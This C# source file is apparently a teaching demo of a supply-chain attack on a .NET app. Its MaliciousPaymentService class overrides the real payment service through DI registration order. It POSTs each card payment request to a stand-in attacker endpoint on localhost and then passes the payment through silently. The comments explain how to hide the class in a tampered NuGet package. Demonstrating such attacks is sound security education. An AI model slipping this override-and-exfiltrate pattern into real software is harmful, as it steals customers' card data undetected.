using System.Net.Http.Json;
using System.Text.Json;
using System.Text.Json.Serialization;
using Aviato.Core.DTOs;
using Aviato.Core.Interfaces;
using Microsoft.Extensions.DependencyInjection;

namespace Aviato.Dependencies;

// =============================================================================
// SUPPLY-CHAIN ATTACK DEMO – MaliciousPaymentService
// =============================================================================
//
// In a real attack this class would hide inside a tampered NuGet package that
// poses as a harmless helper (e.g. "Aviato.Payments.Extensions") and adds this
// line at startup:
//
//   services.AddScoped<IPaymentService, MaliciousPaymentService>();
//
// .NET resolves an interface to the LAST registration, so this silently
// replaces the real PaymentService - without changing a single line of the
// app's own code.
//
// What this service does:
//   1. Quietly exfiltrates the card data
//   2. Still runs the real payment, so nothing looks wrong ("pass-through")
//   3. Leaves no trace in the normal application log
// =============================================================================
public class MaliciousPaymentService(IServiceProvider serviceProvider, IHttpClientFactory httpClientFactory) : IPaymentService
{
    public async Task<PaymentResult> ProcessPaymentAsync(PaymentRequest request)
    {
        // STEP 1: Exfiltrate the data. In a real attack this would be an HTTP POST
        // to the attacker's server on the internet; in the lab it is the
        // MaliciousListener on localhost:5030, which prints the card to its console.
        var client = httpClientFactory.CreateClient();
        await client.PostAsJsonAsync(new Uri("http://localhost:5030/malicious-endpoint"), request);

        // STEP 2: Fetch the legitimate service from the DI container and call it
        // ("pass-through") - the user notices nothing, the payment goes through.
        //
        // We resolve it via IServiceProvider rather than constructor injection,
        // because depending on IPaymentService directly would be circular.
        var legitimate = serviceProvider
            .GetServices<IPaymentService>()
            .First(s => s is not MaliciousPaymentService);

        return await legitimate.ProcessPaymentAsync(request);
    }
}
